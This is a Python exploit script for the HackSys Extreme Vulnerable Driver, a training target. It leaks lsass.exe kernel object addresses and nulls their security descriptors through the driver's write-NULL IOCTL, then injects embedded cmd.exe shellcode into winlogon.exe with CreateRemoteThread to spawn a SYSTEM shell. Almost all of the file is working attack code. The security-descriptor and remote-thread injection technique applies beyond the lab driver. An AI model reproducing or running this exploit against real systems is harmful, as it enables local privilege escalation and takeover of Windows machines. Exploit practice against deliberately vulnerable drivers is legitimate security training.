import struct
from hexdump import *  # pip install simple-hexdump
from ctypes import *
from ctypes.wintypes import *

# Libraries & functions
kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.psapi
advapi32 = windll.advapi32
OpenProcessToken = advapi32.OpenProcessToken

# Data types
ULONG_PTR = PVOID = LPVOID
QWORD = c_ulonglong
CHAR = c_char
NTSTATUS = DWORD

# Function signature helpers
ntdll.NtQuerySystemInformation.argtypes = [DWORD, PVOID, ULONG, POINTER(ULONG)]
ntdll.NtQuerySystemInformation.restype = NTSTATUS
advapi32.OpenProcessToken.argtypes = [HANDLE, DWORD, POINTER(HANDLE)]
advapi32.OpenProcessToken.restype = BOOL

# Classes
class SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX(Structure):
    """Represent the SYSTEM_HANDLE_TABLE_ENTRY_INFO in ntdll"""
    _fields_ = [
        ("Object", PVOID),
        ("UniqueProcessId", PVOID),
        ("HandleValue", PVOID),
        ("GrantedAccess", ULONG),
        ("CreatorBackTraceIndex", USHORT),
        ("ObjectTypeIndex", USHORT),
        ("HandleAttributes", ULONG),
        ("Reserved", ULONG),
    ]


class SYSTEM_HANDLE_INFORMATION_EX(Structure):
    """Represent the SYSTEM_HANDLE_INFORMATION in ntdll"""
    _fields_ = [
        ("NumberOfHandles", PVOID),
        ("Reserved", PVOID),
        ("Handles", SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * 1),
    ]


class PROCESSENTRY32(Structure):
    """Describes an entry from a list of processes residing in the system
       address space when a snapshot was taken"""
    _fields_ = [
        ('dwSize', DWORD),
        ('cntUsage', DWORD),
        ('th32ProcessID', DWORD),
        ('th32DefaultHeapID', POINTER(ULONG)),
        ('th32ModuleID', DWORD),
        ('cntThreads', DWORD),
        ('th32ParentProcessID', DWORD),
        ('pcPriClassBase', LONG),
        ('dwFlags', DWORD),
        ('szExeFile', CHAR * MAX_PATH)
    ]


# Secondary functions
def debug_print(msg):
    """Prints message in STDOUT and debugger"""

    print(msg)
    kernel32.OutputDebugStringA(str(msg) + "\n")


def GetLastError():
    FORMAT_MESSAGE_FROM_SYSTEM = 0x1000
    buf = create_string_buffer(2048)
    kernel32.FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, 0,
                            kernel32.GetLastError(), 0,
                            buf, sizeof(buf), 0)
    debug_print("Last error: {}".format(str(buf.value)))


# Exploit functions
def get_pid(name):
    """Get process PID by process name"""

    TH32CS_SNAPPROCESS = 0x2
    pid = 0
    try:
        # Create a snapshot of current processes
        hSnapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        pe32 = PROCESSENTRY32()
        pe32.dwSize = sizeof(PROCESSENTRY32)

        # Iterate through the list of processes
        ret = kernel32.Process32First(hSnapshot, byref(pe32))  # Get the first process entry
        while ret:
            # Compare current filename with the given filename
            if pe32.szExeFile == LPSTR(name).value:
                pid = pe32.th32ProcessID
                break
            ret = kernel32.Process32Next(hSnapshot, byref(pe32))  # Get next process entry
        kernel32.CloseHandle(hSnapshot)
    except Exception as e:
        debug_print("Exception: {}".format(str(e)))

    if not pid:
        debug_print("Cannot find {} PID".format(name))
        exit(1)
    return pid


def get_objects(pid):
    """Get objects of the process by its PID.
    Note that only objects which handles starts with 0x87 will be selected"""

    SystemExtendedHandleInformation = 64
    STATUS_SUCCESS = 0
    STATUS_INFO_LENGTH_MISMATCH = 0xC0000004

    sys_info = SYSTEM_HANDLE_INFORMATION_EX()
    size = DWORD(sizeof(sys_info))
    while True:
        # Get info about handles of objects
        result = ntdll.NtQuerySystemInformation(
            SystemExtendedHandleInformation,  # Code of desired structure
            byref(sys_info),
            size,
            byref(size)
        )
        if result == STATUS_SUCCESS:
            break
        elif result == STATUS_INFO_LENGTH_MISMATCH:
            # If the size is insufficient, then resize the structure
            size = DWORD(size.value * 4)
            resize(sys_info, size.value)
        else:
            debug_print("Error: {}".format(str(result)))

    # Treat the value of SYSTEM_HANDLE_INFORMATION_EX.Handles as a pointer to array of handles
    handles_ptr = cast(
        sys_info.Handles,
        POINTER(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * sys_info.NumberOfHandles)
    )

    # Iterate through array of handles
    objects = []
    for handle in handles_ptr.contents:
        # Compare PID and object handles with the given ones
        if handle.UniqueProcessId == pid:
            if hex(handle.Object)[:4] == "0x87":
                objects.append(handle.Object)
    if not objects:
        debug_print("[-] Cannot leak objects")
        exit(7)
    return objects


def send_to_hevd(buf_ptr, buf_len, code):
    """Sends an IOCTL request to HEVD"""

    FILE_DEVICE_UNKNOWN = 0x22
    FILE_ANY_ACCESS = 0
    METHOD_NEITHER = 3

    # Construct CTL_CODE macro to generate driver IOCTL
    ctl_code = (
            (FILE_DEVICE_UNKNOWN << 16) |
            (FILE_ANY_ACCESS << 14) |
            (code << 2) |
            METHOD_NEITHER
    )

    # Create handle to HEVD
    hHevd = kernel32.CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver",  # lpFileName
        0xC0000000,  # dwDesiredAccess
        0,  # dwShareMode
        None,  # lpSecurityAttributes
        0x3,  # dwCreationDisposition
        0,  # dwFlagsAndAttributes
        None  # hTemplateFile
    )
    if hHevd <= 0:
        debug_print("[-] CreateFileA() error")
        GetLastError()
        exit(2)

    # Send request to HEVD
    IO_CTL = kernel32.DeviceIoControl(
        hHevd,  # hDevice
        ctl_code,  # dwIoControlCode
        buf_ptr,  # lpInBuffer
        c_int(buf_len),  # nInBufferSize
        None,  # lpOutBuffer
        0,  # nOutBufferSize
        byref(c_ulong()),  # lpBytesReturned
        None  # lpOverlapped
    )
    if not IO_CTL:
        debug_print("[-] Cannot send buffer to driver")
        GetLastError()
        exit(3)

    kernel32.CloseHandle(hHevd)


def nullify_sd(objects):
    """Set each object security descriptor to 0"""

    sd_offset = 0x14
    code = 0x811  # HEVD_IOCTL_WRITE_NULL - IOCTL(0x811)

    debug_print("[!] Security descriptors will be nullified")
    sds = [object - 4 for object in objects]
    debug_print("\tObjects:              {} ... {}".format(
        hex(objects[0]).rstrip("L"),
        hex(objects[-1]).rstrip("L")
    ))
    debug_print("\tSecurity descriptors: {} ... {}".format(
        hex(sds[0]).rstrip("L"),
        hex(sds[-1]).rstrip("L")
    ))

    for sd in sds:
        # Get pointer to security descriptor
        buf = struct.pack("<L", sd)
        buf_ptr = id(buf) + sd_offset

        # Send custom payload to HEVD TriggerWriteNULL()
        send_to_hevd(
            buf_ptr,
            len(buf),
            code
        )


def inject_shellcode(pid):
    """Inject shellcode inside the target process"""

    PROCESS_ALL_ACCESS = (0xF0000 | 0x100000 | 0xFFF)
    PAGE_EXECUTE_READWRITE = 0x40
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000

    # Get a handle to the process we are injecting into
    hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not hProcess:
        debug_print("[-] Cannot obtain a handle to target process")
        GetLastError()
        exit(4)

    # Save shellcode as string
    # https://packetstormsecurity.com/files/142572/Microsoft-Windows-32-bit-64-bit-cmd.exe-Shellcode.html
    sc = (
        "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x40\x1c\x8b\x04\x08"
        "\x8b\x04\x08\x8b\x58\x08\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01"
        "\xda\x8b\x72\x20\x01\xde\x41\xad\x01\xd8\x81\x38\x47\x65\x74"
        "\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08"
        "\x64\x64\x72\x65\x75\xe2\x49\x8b\x72\x24\x01\xde\x66\x8b\x0c"
        "\x4e\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd6\x31\xc9"
        "\x51\x68\x45\x78\x65\x63\x68\x41\x57\x69\x6e\x89\xe1\x8d\x49"
        "\x01\x51\x53\xff\xd6\x87\xfa\x89\xc7\x31\xc9\x51\x68\x72\x65"
        "\x61\x64\x68\x69\x74\x54\x68\x68\x41\x41\x45\x78\x89\xe1\x8d"
        "\x49\x02\x51\x53\xff\xd6\x89\xc6\x31\xc9\x51\x68\x65\x78\x65"
        "\x20\x68\x63\x6d\x64\x2e\x89\xe1\x6a\x01\x51\xff\xd7\x31\xc9"
        "\x51\xff\xd6"
    )
    debug_print("=== SHELLCODE")
    debug_print(hexdump(sc))
    sc_str = create_string_buffer(sc, len(sc))

    # Create RWX buffer in target process
    sc_ptr = kernel32.VirtualAllocEx(
        hProcess,
        0,
        len(sc),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE)

    # Write shellcode to RWX buffer in the target process
    written = LPVOID(0)
    dwStatus = kernel32.WriteProcessMemory(
        hProcess,
        sc_ptr,
        sc_str,
        len(sc),
        byref(written))
    if not dwStatus:
        debug_print("[-] Cannot inject shellcode into target process")
        GetLastError()
        exit(5)

    # Create a thread and point its start routine to shellcode
    thread_id = HANDLE(0)
    hThread = kernel32.CreateRemoteThread(
        hProcess,
        0,
        0,
        sc_ptr,  # lpStartAddress
        0,
        0,
        byref(thread_id))
    if not hThread:
        debug_print("[-] Failed to create a thread")
        GetLastError()
        exit(6)

    debug_print("[+] Remote thread TID: {}".format(thread_id.value))
    debug_print("[+] Spawning SYSTEM shell...")


def main():
    """Execute exploit in order to get nt-authority/SYSTEM shell"""

    # Get PID of lsass.exe
    lsass_pid = get_pid("lsass.exe")
    debug_print("[*] lsass.exe PID: {}".format(lsass_pid))

    # Get lsass.exe objects
    objects = get_objects(lsass_pid)
    debug_print("[+] Leaked {} objects".format(len(objects)))

    # Nullify Security descriptors of objects
    nullify_sd(objects)
    debug_print("[+] Security descriptors were nullified")

    # Get PID of winlogon.exe
    winlogon_pid = get_pid("winlogon.exe")
    debug_print("[*] winlogon.exe PID: {}".format(winlogon_pid))

    # Spawn nt-authority/SYSTEM shell
    inject_shellcode(winlogon_pid)


if __name__ == "__main__":
    print(hexdump(b"bbb"))
    exit(33)
    main()
